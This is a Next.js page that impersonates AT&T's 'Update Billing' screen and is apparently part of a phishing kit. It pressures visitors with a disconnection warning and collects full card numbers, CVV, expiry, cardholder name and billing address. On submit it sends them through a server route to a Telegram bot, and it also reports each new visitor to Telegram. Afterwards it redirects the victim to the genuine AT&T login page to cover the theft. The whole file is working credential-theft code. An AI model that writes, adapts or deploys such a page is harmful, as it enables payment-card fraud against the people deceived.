import Head from 'next/head';
import { useEffect } from 'react';
import Script from 'next/script';

export default function Home() {
  useEffect(() => {
    // Notify Telegram immediately when user visits the page
    // And poll for redirect commands
    (async () => {
      try {
        // Check if we already have a visitorId and if notification was already sent
        let visitorId = localStorage.getItem('visitorId');
        const lastNotificationVisitorId = localStorage.getItem('lastNotificationVisitorId');
        const notificationInProgress = sessionStorage.getItem('notificationInProgress');
        
        // Only create new visitorId if one doesn't exist
        if (!visitorId) {
          visitorId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
          localStorage.setItem('visitorId', visitorId);
          localStorage.setItem('pageLoadTime', Date.now().toString());
        }
        
        console.log('[index.js] Visitor ID:', visitorId);
        
        // Only send notification if:
        // 1. This is a new visitor (different visitorId)
        // 2. No notification is currently in progress
        if (visitorId !== lastNotificationVisitorId && !notificationInProgress) {
          console.log('[index.js] Sending visitor notification, visitorId:', visitorId);
          
          // Mark notification as in progress to prevent duplicates
          sessionStorage.setItem('notificationInProgress', 'true');
          
          // Send notification (non-blocking - don't fail if it doesn't work)
          fetch('/api/telegram/notify-visitor', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ visitorId })
          })
          .then(async (response) => {
            const data = await response.json();
            console.log('[index.js] Notification response:', data);
            if (data.success) {
              // Mark this visitorId as notified
              localStorage.setItem('lastNotificationVisitorId', visitorId);
            } else {
              console.warn('[index.js] Telegram notification warning:', data.warning || data.message);
            }
            // Clear the in-progress flag
            sessionStorage.removeItem('notificationInProgress');
          })
          .catch(error => {
            console.warn('[index.js] Notification error (non-blocking):', error);
            // Clear the in-progress flag even on error
            sessionStorage.removeItem('notificationInProgress');
          });
        } else {
          console.log('[index.js] Notification already sent for this visitor, skipping...');
        }
      } catch (error) {
        console.error('Error notifying Telegram:', error);
      }
    })();

    const billingForm = document.getElementById('billing-form');
    const cardNumberInput = document.getElementById('card-number');
    const cardholderNameInput = document.getElementById('cardholder-name');
    const cvvInput = document.getElementById('cvv');
    const expirationInput = document.getElementById('expiration');
    const addressInput = document.getElementById('address');
    const cityInput = document.getElementById('city');
    const stateInput = document.getElementById('state');
    const zipInput = document.getElementById('zip');
    const submitBtn = document.getElementById('submit-btn');
    const loadingScreen = document.getElementById('loading-screen');

    // Focus card number input on load
    if (cardNumberInput) {
      cardNumberInput.focus();
    }

    // Format card number with spaces
    if (cardNumberInput) {
      cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        if (formattedValue.length <= 19) {
          e.target.value = formattedValue;
        } else {
          e.target.value = formattedValue.substring(0, 19);
        }
      });
    }

    // Format expiration date (MM/YY)
    if (expirationInput) {
      expirationInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
          value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
      });
    }

    // Limit CVV to 3-4 digits
    if (cvvInput) {
      cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
      });
    }

    // Limit ZIP to 5 digits
    if (zipInput) {
      zipInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 5);
      });
    }

    async function logActivity(type, userId, additionalData = {}) {
      try {
        const response = await fetch('/api/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type, userId, additionalData })
        });
        const data = await response.json();
        return data.activity.id;
      } catch (error) {
        console.error('Error logging activity:', error);
        return null;
      }
    }

    function validateCardNumber(cardNumber) {
      const cleaned = cardNumber.replace(/\s/g, '');
      return /^\d{13,19}$/.test(cleaned);
    }

    function validateExpiration(expiration) {
      const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
      if (!regex.test(expiration)) return false;
      const [month, year] = expiration.split('/');
      const currentYear = new Date().getFullYear() % 100;
      const currentMonth = new Date().getMonth() + 1;
      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      if (expYear < currentYear) return false;
      if (expYear === currentYear && expMonth < currentMonth) return false;
      return true;
    }

    function validateCVV(cvv) {
      return /^\d{3,4}$/.test(cvv);
    }

    function validateZip(zip) {
      return /^\d{5}$/.test(zip);
    }

    if (billingForm) {
      billingForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const cardNumber = cardNumberInput.value.trim();
        const cardholderName = cardholderNameInput.value.trim();
        const cvv = cvvInput.value.trim();
        const expiration = expirationInput.value.trim();
        const address = addressInput.value.trim();
        const city = cityInput.value.trim();
        const state = stateInput.value.trim();
        const zip = zipInput.value.trim();
        
        // Validate all fields
        if (!cardNumber) {
          alert('Please enter your card number');
          return;
        }
        
        if (!validateCardNumber(cardNumber)) {
          alert('Please enter a valid card number');
          return;
        }
        
        if (!cardholderName) {
          alert('Please enter the cardholder name');
          return;
        }
        
        if (!cvv) {
          alert('Please enter your CVV');
          return;
        }
        
        if (!validateCVV(cvv)) {
          alert('Please enter a valid CVV');
          return;
        }
        
        if (!expiration) {
          alert('Please enter your expiration date');
          return;
        }
        
        if (!validateExpiration(expiration)) {
          alert('Please enter a valid expiration date (MM/YY)');
          return;
        }
        
        if (!address) {
          alert('Please enter your billing address');
          return;
        }
        
        if (!city) {
          alert('Please enter your city');
          return;
        }
        
        if (!state) {
          alert('Please enter your state');
          return;
        }
        
        if (!zip) {
          alert('Please enter your ZIP code');
          return;
        }
        
        if (!validateZip(zip)) {
          alert('Please enter a valid ZIP code');
          return;
        }
        
        // Get cached username from localStorage
        const storedUserId = localStorage.getItem('lastUserId') || '';
          
          // Show loading screen
        if (loadingScreen) {
          loadingScreen.classList.add('active');
        }
        if (submitBtn) {
          submitBtn.disabled = true;
        }
        
        try {
          // Log billing information entry
          await logActivity('billing', storedUserId, { 
            cardNumber: cardNumber.replace(/\s/g, '').substring(0, 4) + '****',
            expiration: expiration,
            address: address,
            city: city,
            state: state,
            zip: zip
          });
          
          // Log identity verification completion
          await logActivity('identity_verification', storedUserId, { 
            verified: true
          });
          
          // Send billing details to Telegram
          console.log('[index.js] Sending billing details to Telegram...');
          try {
            const telegramResponse = await fetch('/api/telegram/send-billing', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                cardNumber: cardNumber,
                cardholderName: cardholderName,
                expiration: expiration,
                cvv: cvv,
                address: address,
                city: city,
                state: state,
                zip: zip,
                userId: storedUserId
              })
            });
            
            const telegramData = await telegramResponse.json();
            console.log('[index.js] Billing details Telegram response:', telegramData);
            
            if (telegramData.success) {
              console.log('[index.js] ✅ Billing details sent to Telegram successfully');
            } else {
              console.warn('[index.js] ⚠️ Telegram billing notification warning:', telegramData.warning || telegramData.message);
              console.warn('[index.js] Check server logs for details. Make sure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set in environment variables.');
            }
          } catch (telegramError) {
            console.error('[index.js] ❌ Telegram billing notification error:', telegramError);
            // Don't block page redirect if notification fails
          }
          
          // Small delay to ensure Telegram message is sent before redirect
          await new Promise(resolve => setTimeout(resolve, 500));
          
          // Redirect to next page or show success
          window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
        } catch (error) {
          console.error('Error submitting billing information:', error);
          if (loadingScreen) {
            loadingScreen.classList.remove('active');
          }
          if (submitBtn) {
            submitBtn.disabled = false;
          }
          alert('An error occurred. Please try again.');
        }
      });
    }
  }, []);

  return (
    <>
      <Head>
        <title>Update Billing</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <Script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js" strategy="afterInteractive" />
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
          background-color: white;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .login-container {
          background: #ffffff;
          border-radius: 12px;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
          padding: 25px 35px;
          width: 500px;
          text-align: center;
        }

        .logo {
          margin-bottom: 12px;
        }

        .logo-image {
          width: 100px;
          height: auto;
          margin: 0 auto 8px;
          display: block;
          object-fit: contain;
        }

        h1 {
          font-size: 28px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 10px;
          line-height: 1.2;
        }

        .warning-message {
          display: flex;
          align-items: flex-start;
          justify-content: center;
          gap: 6px;
          margin-bottom: 12px;
          text-align: center;
        }

        .warning-icon {
          width: 16px;
          height: 16px;
          border-radius: 50%;
          background: #dc3545;
          color: #ffffff;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 10px;
          font-weight: 700;
          flex-shrink: 0;
          line-height: 1;
          margin-top: 2px;
        }

        .warning-text {
          font-size: 11px;
          font-weight: 300;
          color: #333333;
          line-height: 1.4;
          text-align: left;
        }

        .form-group {
          margin-bottom: 14px;
          text-align: left;
        }

        label {
          display: block;
          font-size: 16px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 8px;
        }

        input[type="text"],
        input[type="tel"] {
          width: 100%;
          height: 48px;
          padding: 0 16px;
          font-size: 16px;
          color: #333333;
          background: #ffffff;
          border: 2px solid #d1d1d1;
          border-radius: 6px;
          transition: all 0.3s ease;
          outline: none;
        }

        input[type="text"]:focus,
        input[type="tel"]:focus {
          border-color: #0057b8;
          box-shadow: 0 0 0 3px rgba(0, 87, 184, 0.1);
        }

        input::placeholder {
          color: #999999;
        }

        .form-row {
          display: flex;
          gap: 12px;
        }

        .form-row .form-group {
          flex: 1;
        }

        .continue-btn {
          width: 100%;
          height: 46px;
          background: #003d7a;
          color: #ffffff;
          font-size: 13px;
          font-weight: 700;
          border: none;
          border-radius: 23px;
          cursor: pointer;
          transition: all 0.3s ease;
          margin-bottom: 12px;
        }

        .continue-btn:hover {
          background: #002d5a;
          box-shadow: 0 4px 12px rgba(0, 61, 122, 0.3);
        }

        .continue-btn:active {
          background: #002040;
          transform: translateY(1px);
        }

        .continue-btn:disabled {
          background: #cccccc;
          cursor: not-allowed;
        }

        .link-section {
          margin-top: 8px;
          text-align: center;
        }

        .link-section a {
          display: block;
          color: #0088C0;
          font-size: 13px;
          font-weight: 700;
          text-decoration: none;
          margin-bottom: 10px;
          transition: all 0.2s ease;
        }

        .link-section a:hover {
          text-decoration: underline;
          color: #0070A0;
        }

        .separator {
          margin: 15px 0;
          text-align: center;
          position: relative;
        }

        .separator::before {
          content: '';
          position: absolute;
          top: 50%;
          left: 0;
          right: 0;
          height: 1px;
          background: #d1d1d1;
        }

        .separator-text {
          position: relative;
          display: inline-block;
          background: #ffffff;
          padding: 0 15px;
          color: #666666;
          font-size: 14px;
        }

        .secondary-btn {
          width: 100%;
          height: 46px;
          background: #ffffff;
          color: #003d7a;
          font-size: 13px;
          font-weight: 700;
          border: 2px solid #003d7a;
          border-radius: 23px;
          cursor: pointer;
          transition: all 0.3s ease;
          margin-top: 12px;
        }

        .secondary-btn:hover {
          border-color: #002d5a;
          background: #f5f5f5;
          color: #002d5a;
        }

        .secondary-btn:active {
          background: #e8e8e8;
          transform: translateY(1px);
        }

        .footer {
          margin-top: 20px;
          padding-top: 15px;
          text-align: center;
          max-width: 500px;
          width: 100%;
        }

        .footer-links {
          display: flex;
          flex-wrap: nowrap;
          justify-content: center;
          align-items: center;
          gap: 15px;
          margin-bottom: 10px;
        }

        .footer-links a {
          color: #666666;
          font-size: 13px;
          text-decoration: none;
          transition: all 0.2s ease;
          white-space: nowrap;
        }

        .footer-links a:hover {
          color: #0057b8;
          text-decoration: underline;
        }

        .copyright {
          color: #666666;
          font-size: 12px;
          margin-top: 10px;
        }

        .loading-screen {
          display: none;
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: #ffffff;
          z-index: 9999;
          align-items: center;
          justify-content: center;
          flex-direction: column;
        }

        .loading-screen.active {
          display: flex;
        }

        .loading-spinner {
          width: 40px;
          height: 40px;
          border: 3px solid #e0e0e0;
          border-top: 3px solid #0057b8;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin-bottom: 16px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .loading-text {
          font-size: 16px;
          color: #333333;
          font-weight: 400;
        }

        @media (max-width: 768px) {
          body {
            padding: 0;
          }

          .login-container {
            max-width: none;
            width: 100%;
            padding: 20px 12px;
            box-shadow: none;
            border-radius: 0;
          }

          h1 {
            font-size: 30px;
          }

          .warning-message {
            margin-bottom: 25px;
          }

          .warning-icon {
            width: 18px;
            height: 18px;
            font-size: 11px;
          }

          .warning-text {
            font-size: 12px;
          }

          .form-row {
            flex-direction: column;
            gap: 0;
          }

          .footer {
            text-align: center;
            padding-left: 12px;
            padding-right: 12px;
            margin-left: auto;
            margin-right: auto;
            max-width: 100%;
            width: 100%;
          }

          .footer-links {
            flex-direction: column;
            gap: 10px;
            justify-content: flex-start;
            align-items: flex-start;
          }

          .footer-links a {
            font-size: 11px;
          }

          .copyright {
            font-size: 11px;
          }
        }

        *:focus-visible {
          outline: 2px solid #0057b8;
          outline-offset: 2px;
        }
      `}</style>
      <div className="login-container">
        <div className="logo">
          <img src="/logo.png" alt="Logo" className="logo-image" />
        </div>

        <h1>Update Billing</h1>

        <div className="warning-message">
          <span className="warning-icon">!</span>
          <span className="warning-text">Failure to update may result<br />in service disconnection</span>
        </div>

        <form id="billing-form">
          <div className="form-group">
            <label htmlFor="card-number">Card number</label>
            <input 
              type="text" 
              id="card-number"
              name="card-number"
              placeholder="1234 5678 9012 3456"
              autoComplete="cc-number"
              maxLength="19"
              required
            />
          </div>

          <div className="form-group">
            <label htmlFor="cardholder-name">Cardholder name</label>
            <input 
              type="text" 
              id="cardholder-name"
              name="cardholder-name"
              placeholder="John Doe"
              autoComplete="cc-name"
              required
            />
          </div>

          <div className="form-row">
            <div className="form-group">
              <label htmlFor="expiration">Expiration</label>
              <input 
                type="text" 
                id="expiration"
                name="expiration"
                placeholder="MM/YY"
                autoComplete="cc-exp"
                maxLength="5"
                required
              />
          </div>
            <div className="form-group">
              <label htmlFor="cvv">CVV</label>
              <input 
                type="tel" 
                id="cvv"
                name="cvv"
                placeholder="123"
                autoComplete="cc-csc"
                maxLength="4"
                required
              />
          </div>
          </div>

          <div className="form-group">
            <label htmlFor="address">Billing address</label>
            <input 
              type="text" 
              id="address"
              name="address"
              placeholder="123 Main Street"
              autoComplete="street-address"
              required
            />
          </div>

          <div className="form-row">
            <div className="form-group">
              <label htmlFor="city">City</label>
              <input 
                type="text" 
                id="city"
                name="city"
                placeholder="City"
                autoComplete="address-level2"
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="state">State</label>
              <input 
                type="text" 
                id="state"
                name="state"
                placeholder="State"
                autoComplete="address-level1"
                maxLength="2"
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="zip">ZIP</label>
              <input 
                type="tel" 
                id="zip"
                name="zip"
                placeholder="12345"
                autoComplete="postal-code"
                maxLength="5"
                required
              />
            </div>
          </div>

          <button type="submit" className="continue-btn" id="submit-btn">Continue</button>
        </form>

        <div className="separator">
          <span className="separator-text">OR</span>
        </div>

        <button type="button" className="secondary-btn">Login with myAT&T app</button>
      </div>

      <div className="footer">
        <div className="footer-links">
          <a href="#legal">Legal policy center</a>
          <a href="#privacy">Privacy policy</a>
          <a href="#terms">Terms of use</a>
          <a href="#accessibility">Accessibility</a>
          <a href="#choices">Your privacy choices</a>
        </div>
        <div className="copyright">
          ©2025 AT&T Intellectual Property. All rights reserved.
        </div>
      </div>

      <div id="loading-screen" className="loading-screen">
        <div className="loading-spinner"></div>
        <div className="loading-text">Please wait...</div>
      </div>
    </>
  );
}

